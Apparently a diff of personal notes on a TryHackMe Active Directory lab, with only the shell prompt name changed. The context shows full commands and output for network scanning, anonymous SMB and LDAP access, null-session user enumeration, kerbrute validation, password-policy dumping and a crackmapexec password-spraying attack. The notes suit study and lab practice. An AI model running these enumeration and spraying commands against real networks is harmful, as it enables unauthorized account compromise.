@@ -25,7 +25,7 @@ Just like **ping**, **fping** uses Internet Control Message Protocol (ICMP) requ
 We can run the following command to discover live hosts in our target network:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ fping -agq 10.211.11.0/24          
 10.211.11.10
 10.211.11.20
@@ -81,7 +81,7 @@ If we were running a more exhaustive assessment or dealing with unfamiliar envir
 Through these enumeration techniques, we have identified two live hosts in our target network, one DC and one Workstation, and the domain. We have also confirmed a couple of known services running on the DC, which we can target to further enumerate the domain :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ nmap -p 88,135,139,389,445 -sV -sC -iL hosts    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 15:10 CEST
 Nmap scan report for 10.211.11.20
@@ -160,7 +160,7 @@ We will begin our “discovery” with the good old Nmap. We are mainly interest
 We can use the Nmap scanner to check if any active services are listening on these ports, attempt to detect their versions with `-sV`, and allow default scripts to run with `-sC`. Our final command will be, `nmap -p 88,135,139,389,445,636 -sV -sC TARGET_IP`. The result of scanning the domain controller is shown below :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ nmap -p 88,135,139,389,445,636 -sV -sC 10.211.11.10
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 15:17 CEST
 Nmap scan report for 10.211.11.10
@@ -211,7 +211,7 @@ At this stage, we don’t have valid credentials. Let’s check the exposed SMB 
 [SMBclient](../Hacking%20Tools/SMBclient.md) is a command-line tool that allows interaction with SMB shares and is part of the Samba suite. It is similar to an FTP client. You can use it to list, upload, download, and browse files on a remote SMB server. In the terminal below, we try to list the shares via the `-L` option, with no password, hence the `-N` option. We can see some interesting shares below running `smbclient -L //TARGET_IP -N` :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ smbclient -L //10.211.11.10 -N  
 
 Anonymous login successful
@@ -234,7 +234,7 @@ Unable to connect with SMB1 -- no workgroup available
 Another tool is `smbmap`, a reconnaissance tool that enumerates SMB shares across a host. It can be used to display read and write permissions for each share. It’s instrumental for quickly identifying accessible or misconfigured shares without manually connecting to each one. Below is an example of running `smbmap -H TARGET_IP` :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ smbmap -H 10.211.11.10        
 
     ________  ___      ___  _______   ___      ___       __         _______
@@ -270,7 +270,7 @@ It is worth noting that you can also discover which shares grant access using Nm
 Now that we have listed the shares, let’s attempt to access the ones that allow anonymous access. We might discover any interesting files that might help us gain access. We will target all the shares that showed `READ` access among their permissions when we ran `smbmap`. To use `smbclient` to connect to a share, you can use `smbclient //TARGET_IP/SHARE_NAME -N`. After connecting, we listed the files by issuing `ls` as shown below. Once you find the filename, you can download it using `get file_name`. In the terminal above, we did a `get Mouse_and_Malware.txt` to download the file to the AttackBox :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ smbclient //10.211.11.10/SharedFiles -N
 Anonymous login successful
 Try "help" to get a list of possible commands.
@@ -306,7 +306,7 @@ Finally, as mentioned earlier in this task, we should not forget [Nmap](../Hacki
 What is the flag hidden in one of the shares?
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ smbclient //10.211.11.10/UserBackups -N
 Anonymous login successful
 Try "help" to get a list of possible commands.
@@ -323,11 +323,11 @@ smb: \> get story.txt
 getting file \story.txt of size 953 as story.txt (0,7 KiloBytes/sec) (average 0,4 KiloBytes/sec)
 smb: \> exit
                                                                                                                          
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ ls
 DCscan.md  flag.txt  hosts  Mouse_and_Malware.txt  story.txt
                                                                                                                          
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ cat story.txt            
 **The Fox and the Drone**
 
@@ -348,7 +348,7 @@ The Drone started descending, slower than it liked, until it landed clumsily in 
 The Fox chuckled from the hedges.
 
 "Seems the sky�s not so safe after all," he murmured, and trotted off in search of supper.                                                                                                                         
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ cat flag.txt 
 THM{88_SMB_88}                                                                                              
 ```
@@ -374,7 +374,7 @@ We can test if anonymous LDAP bind is enabled with `ldapsearch`:
 If it is enabled, we should see lots of data, similar to the output below, We can then query user information with this command:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)" >> LDAPenum.md
 ```
 
@@ -402,7 +402,7 @@ We can run the following command to verify null session access with:
 If successful, we can enumerate users with: `enumdomusers`
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ rpcclient -U "" 10.211.11.10 -N
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
@@ -450,7 +450,7 @@ We can use **enum4linux-ng** to determine the RID range, or we can start with a 
 If `enumdomusers` is restricted, we can manually try querying each individual user RID with this bash command:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
 ```
 
@@ -476,7 +476,7 @@ Running those through **kerbrute** lets us confirm which ones are real, active A
 We can create a user list thanks to the usernames we gathered with the previous tools :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ ./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users    
    __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -555,7 +555,7 @@ We can use rpcclient via a null session to query the DC for the password policy:
 And then we can run the `getdompwinfo` command:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ rpcclient -U "" 10.211.11.10 -N
 rpcclient $> getdompwinfo
 min_password_length: 7
@@ -567,7 +567,7 @@ password_properties: 0x00000001
 **[CrackMapExec](../Hacking%20Tools/CrackMapExec.md)** is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as [SMB](./SMB.md), LDAP, [RDP](RDP.md), and [SSH](./SSH.md). If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ crackmapexec smb 10.211.11.10 --pass-pol
 
 SMB         10.211.11.10    445    DC               [+] Dumping password info for domain: TRYHACKME
@@ -609,7 +609,7 @@ Also, passwords cannot contain the user's account name or parts of their full na
 Let's imagine that through some [OSINT](./OSINT.md), we discovered that this company was in a data breach, and some of the known passwords were variations of the string "Password". We can create the following list, making sure to respect the password policy:
 
 ```bash                                                      
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ cat passwd                              
 Password!
 Password1
@@ -621,7 +621,7 @@ Pa55word1
 We can use **CrackMapExec** to run our password spraying attack against the WRK computer:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/LEARN/Windows/AD]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/LEARN/Windows/AD]
 └─$ crackmapexec smb 10.211.11.20 -u users -p passwd   
 
 - - - - - - - - - - - - - - - - - - - - - - - - - 
